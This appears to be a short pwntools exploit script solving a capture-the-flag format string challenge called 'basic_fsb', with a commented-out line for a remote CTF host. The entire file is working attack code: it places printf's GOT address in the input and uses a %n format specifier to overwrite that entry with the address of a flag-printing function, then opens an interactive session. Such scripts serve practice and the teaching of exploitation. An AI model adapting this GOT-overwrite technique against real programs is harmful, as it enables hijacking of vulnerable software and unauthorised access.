from pwn import *

p = process('./basic_fsb')
# p = remote('ctf.j0n9hyun.xyz', 3002)
p.recvuntil('input : ')

flag_addr = 0x80485b4
printf_got = 0x804a00c
# fini_addr = 0x08049f0c

log.info(str(flag_addr - 4).encode())

payload = p32(printf_got)
payload += b'%'+ str(flag_addr - 4).encode() + b'x%n'
# gdb.attach(p)
p.sendline(payload)

p.interactive()
